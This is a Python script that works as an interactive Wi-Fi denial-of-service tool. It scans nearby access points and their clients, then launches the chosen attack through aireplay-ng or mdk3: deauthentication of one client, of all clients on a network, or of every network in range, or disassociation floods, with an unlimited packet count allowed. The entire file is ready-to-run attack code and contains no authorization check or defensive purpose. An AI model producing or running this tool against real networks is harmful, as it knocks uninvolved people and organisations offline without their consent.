#!/usr/bin/env python3
import subprocess
import os
import time
import re
import signal
import sys
from datetime import datetime

class DeauthFrameSender:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.target_ap = None
        self.target_client = None
        self.packets_sent = 0
        self.processes = []
        
    def check_requirements(self):
        required = ['airmon-ng', 'aireplay-ng', 'airodump-ng', 'mdk3', 'mdk4']
        missing = []
        for tool in required:
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            except:
                if tool not in ['mdk3', 'mdk4']:
                    missing.append(tool)
        return missing
    
    def get_interfaces(self):
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True, timeout=5)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'wlan' in line.lower() or 'wlp' in line.lower():
                    parts = line.split()
                    if parts:
                        interfaces.append(parts[0])
            return interfaces
        except:
            return []
    
    def enable_monitor_mode(self, interface):
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if 'monitor mode' in line.lower() and 'enabled' in line.lower():
                    match = re.search(r'(wlan\d+mon|mon\d+|wlp\S+mon)', line)
                    if match:
                        self.monitor_interface = match.group(1)
                        return True
            self.monitor_interface = f"{interface}mon"
            return True
        except:
            return False
    
    def scan_networks_clients(self, duration=20):
        print(f"\033[93m[*] Scanning networks and clients ({duration}s)...\033[0m\n")
        
        scan_file = f"/tmp/scan_{int(time.time())}"
        cmd = ['airodump-ng', self.monitor_interface, '-w', scan_file, '--output-format', 'csv']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.processes.append(proc)
        
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
        
        networks = []
        clients = {}
        
        try:
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='latin-1') as f:
                    content = f.read()
                
                lines = content.split('\n')
                in_ap_section = False
                in_client_section = False
                
                for line in lines:
                    if 'BSSID' in line and 'PWR' in line:
                        in_ap_section = True
                        in_client_section = False
                        continue
                    elif 'Station MAC' in line:
                        in_ap_section = False
                        in_client_section = True
                        continue
                    
                    if in_ap_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14 and ':' in parts[0]:
                            bssid = parts[0]
                            channel = parts[3]
                            essid = parts[13]
                            
                            if essid and bssid and channel.isdigit():
                                networks.append({
                                    'bssid': bssid,
                                    'channel': channel,
                                    'essid': essid
                                })
                    
                    elif in_client_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 6 and ':' in parts[0]:
                            station = parts[0]
                            bssid = parts[5]
                            if bssid and bssid != '(not associated)':
                                if bssid not in clients:
                                    clients[bssid] = []
                                if station not in clients[bssid]:
                                    clients[bssid].append(station)
                
                for f in [f"{scan_file}-01.csv", f"{scan_file}-01.cap"]:
                    if os.path.exists(f):
                        os.remove(f)
        except:
            pass
        
        return networks, clients
    
    def targeted_deauth(self, ap_bssid, client_mac, count=0, channel=None):
        print(f"\n\033[93m[*] Targeted deauth attack\033[0m")
        print(f"\033[97m  AP: {ap_bssid}\033[0m")
        print(f"\033[97m  Client: {client_mac}\033[0m")
        print(f"\033[97m  Count: {'Unlimited' if count == 0 else count}\033[0m")
        print(f"\033[97m  Press Ctrl+C to stop\033[0m\n")
        
        if channel:
            subprocess.run(['iwconfig', self.monitor_interface, 'channel', channel],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        cmd = ['aireplay-ng', '--deauth', str(count), '-a', ap_bssid, '-c', client_mac, self.monitor_interface]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.processes.append(proc)
            
            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                if 'ACKs' in line or 'packets' in line:
                    match = re.search(r'(\d+)', line)
                    if match:
                        self.packets_sent = int(match.group(1))
                        print(f"\r\033[92m[*] Packets sent: {self.packets_sent}\033[0m", end='', flush=True)
        except KeyboardInterrupt:
            proc.terminate()
            proc.wait(timeout=2)
    
    def broadcast_deauth(self, ap_bssid, count=0, channel=None):
        print(f"\n\033[93m[*] Broadcast deauth attack\033[0m")
        print(f"\033[97m  AP: {ap_bssid}\033[0m")
        print(f"\033[97m  Count: {'Unlimited' if count == 0 else count}\033[0m")
        print(f"\033[97m  Press Ctrl+C to stop\033[0m\n")
        
        if channel:
            subprocess.run(['iwconfig', self.monitor_interface, 'channel', channel],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        cmd = ['aireplay-ng', '--deauth', str(count), '-a', ap_bssid, self.monitor_interface]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.processes.append(proc)
            
            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                if 'ACKs' in line or 'packets' in line:
                    match = re.search(r'(\d+)', line)
                    if match:
                        self.packets_sent = int(match.group(1))
                        print(f"\r\033[92m[*] Packets sent: {self.packets_sent}\033[0m", end='', flush=True)
        except KeyboardInterrupt:
            proc.terminate()
            proc.wait(timeout=2)
    
    def mass_deauth(self, channel=None):
        print(f"\n\033[93m[*] Mass deauth attack (all APs)\033[0m")
        print(f"\033[97m  Press Ctrl+C to stop\033[0m\n")
        
        if channel:
            cmd = ['mdk3', self.monitor_interface, 'd', '-c', channel]
        else:
            cmd = ['mdk3', self.monitor_interface, 'd']
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.processes.append(proc)
            
            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                print(line.rstrip())
        except KeyboardInterrupt:
            proc.terminate()
            proc.wait(timeout=2)
        except FileNotFoundError:
            print(f"\033[91m[!] mdk3 not found, using alternative\033[0m")
            self.alternative_mass_deauth()
    
    def alternative_mass_deauth(self):
        print(f"\n\033[93m[*] Alternative mass deauth\033[0m")
        
        networks, _ = self.scan_networks_clients(10)
        
        if not networks:
            print("\033[91m[!] No networks found\033[0m")
            return
        
        print(f"\033[92m[+] Found {len(networks)} networks\033[0m")
        print(f"\033[93m[*] Deauthing all...\033[0m\n")
        
        try:
            for net in networks:
                cmd = ['aireplay-ng', '--deauth', '5', '-a', net['bssid'], self.monitor_interface]
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"\033[92m[*] {net['essid'][:20]:20s} - {net['bssid']}\033[0m")
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
    
    def disassociation_attack(self, ap_bssid, client_mac=None, channel=None):
        print(f"\n\033[93m[*] Disassociation attack\033[0m")
        print(f"\033[97m  AP: {ap_bssid}\033[0m")
        if client_mac:
            print(f"\033[97m  Client: {client_mac}\033[0m")
        print(f"\033[97m  Press Ctrl+C to stop\033[0m\n")
        
        if channel:
            subprocess.run(['iwconfig', self.monitor_interface, 'channel', channel],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if client_mac:
            cmd = ['aireplay-ng', '--disas', '0', '-a', ap_bssid, '-c', client_mac, self.monitor_interface]
        else:
            cmd = ['aireplay-ng', '--disas', '0', '-a', ap_bssid, self.monitor_interface]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.processes.append(proc)
            
            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                print(line.rstrip())
        except KeyboardInterrupt:
            proc.terminate()
            proc.wait(timeout=2)
    
    def cleanup(self):
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        if self.monitor_interface:
            subprocess.run(['airmon-ng', 'stop', self.monitor_interface],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run():
    print("\033[92m" + "="*70)
    print("     DEAUTHENTICATION FRAME SENDER")
    print("="*70 + "\033[0m\n")
    
    sender = DeauthFrameSender()
    
    def signal_handler(sig, frame):
        print("\n\n\033[93m[!] Stopping...\033[0m")
        sender.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    missing = sender.check_requirements()
    if missing:
        print(f"\033[91m[!] Missing: {', '.join(missing)}\033[0m")
        return
    
    interfaces = sender.get_interfaces()
    if not interfaces:
        print("\033[91m[!] No wireless interfaces\033[0m")
        return
    
    print("\033[97mInterfaces:\033[0m")
    for i, iface in enumerate(interfaces, 1):
        print(f"  [{i}] {iface}")
    
    choice = input("\n\033[95m[?] Select: \033[0m").strip()
    try:
        idx = int(choice) - 1
        selected = interfaces[idx]
    except:
        print("\033[91m[!] Invalid\033[0m")
        return
    
    print(f"\n\033[93m[*] Enabling monitor mode...\033[0m")
    if not sender.enable_monitor_mode(selected):
        print("\033[91m[!] Failed\033[0m")
        return
    
    print(f"\033[92m[+] Monitor: {sender.monitor_interface}\033[0m")
    
    networks, clients = sender.scan_networks_clients(20)
    
    if not networks:
        print("\n\033[91m[!] No networks found\033[0m")
        sender.cleanup()
        return
    
    print(f"\n\033[92m{'='*70}\033[0m")
    print(f"\033[92m  #  |      BSSID       | CH | Clients |         ESSID\033[0m")
    print(f"\033[92m{'='*70}\033[0m")
    
    for i, net in enumerate(networks, 1):
        client_count = len(clients.get(net['bssid'], []))
        print(f"\033[97m {i:2d}  | {net['bssid']} | {net['channel']:2s} | {client_count:7d} | {net['essid'][:20]}\033[0m")
    
    print("\n\033[97mAttack mode:\033[0m")
    print("  [1] Targeted deauth (AP + Client)")
    print("  [2] Broadcast deauth (All clients on AP)")
    print("  [3] Mass deauth (All APs)")
    print("  [4] Disassociation attack")
    
    mode = input("\n\033[95m[?] Select: \033[0m").strip()
    
    if mode in ['1', '2', '4']:
        target = input("\033[95m[?] Target network #: \033[0m").strip()
        try:
            idx = int(target) - 1
            selected_net = networks[idx]
            ap_bssid = selected_net['bssid']
            channel = selected_net['channel']
        except:
            print("\033[91m[!] Invalid\033[0m")
            sender.cleanup()
            return
        
        if mode == '1':
            net_clients = clients.get(ap_bssid, [])
            if not net_clients:
                print("\033[91m[!] No clients found\033[0m")
                sender.cleanup()
                return
            
            print(f"\n\033[97mClients:\033[0m")
            for i, client in enumerate(net_clients, 1):
                print(f"  [{i}] {client}")
            
            client_choice = input("\n\033[95m[?] Select client #: \033[0m").strip()
            try:
                client_idx = int(client_choice) - 1
                client_mac = net_clients[client_idx]
            except:
                print("\033[91m[!] Invalid\033[0m")
                sender.cleanup()
                return
            
            count = input("\033[95m[?] Packet count (0=unlimited): \033[0m").strip()
            count = int(count) if count.isdigit() else 0
            
            sender.targeted_deauth(ap_bssid, client_mac, count, channel)
        
        elif mode == '2':
            count = input("\033[95m[?] Packet count (0=unlimited): \033[0m").strip()
            count = int(count) if count.isdigit() else 0
            
            sender.broadcast_deauth(ap_bssid, count, channel)
        
        elif mode == '4':
            net_clients = clients.get(ap_bssid, [])
            if net_clients:
                print(f"\n\033[97mClients:\033[0m")
                for i, client in enumerate(net_clients, 1):
                    print(f"  [{i}] {client}")
                
                client_choice = input("\n\033[95m[?] Client # (or 'all'): \033[0m").strip()
                
                if client_choice.lower() == 'all':
                    sender.disassociation_attack(ap_bssid, None, channel)
                else:
                    try:
                        client_idx = int(client_choice) - 1
                        client_mac = net_clients[client_idx]
                        sender.disassociation_attack(ap_bssid, client_mac, channel)
                    except:
                        sender.disassociation_attack(ap_bssid, None, channel)
            else:
                sender.disassociation_attack(ap_bssid, None, channel)
    
    elif mode == '3':
        sender.mass_deauth()
    
    print(f"\n\033[92m[+] Attack complete\033[0m")
    print(f"\033[97m[*] Total packets sent: {sender.packets_sent}\033[0m")
    
    sender.cleanup()

if __name__ == "__main__":
    run()
